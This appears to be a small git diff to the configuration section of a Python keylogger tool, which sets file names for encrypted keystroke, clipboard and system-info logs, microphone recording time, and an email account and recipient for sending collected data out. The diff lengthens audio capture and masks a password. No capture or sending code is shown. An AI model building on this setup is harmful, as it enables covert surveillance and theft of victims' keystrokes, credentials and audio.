@@ -35,12 +35,12 @@ keys_info_e = "e_key_log.txt"
 system_info_e = "e_systeminfo.txt"
 clipboard_info_e = "e_clipboard.txt"
 
-microphone_time = 10
+microphone_time = 20
 time_iteration = 15
 number_of_iterations_end = 3
 
 email_address = "example@domain.com" # Enter disposable email here
-password = "myPa55w0rd" # Enter email password here
+password = "*******" # Enter email password here
 toaddr = " " # Enter the email address you want to send your information to
 key = " " # Generate an encryption key from the Cryptography folder
 file_path = " " # Enter the file path you want your files to be saved to
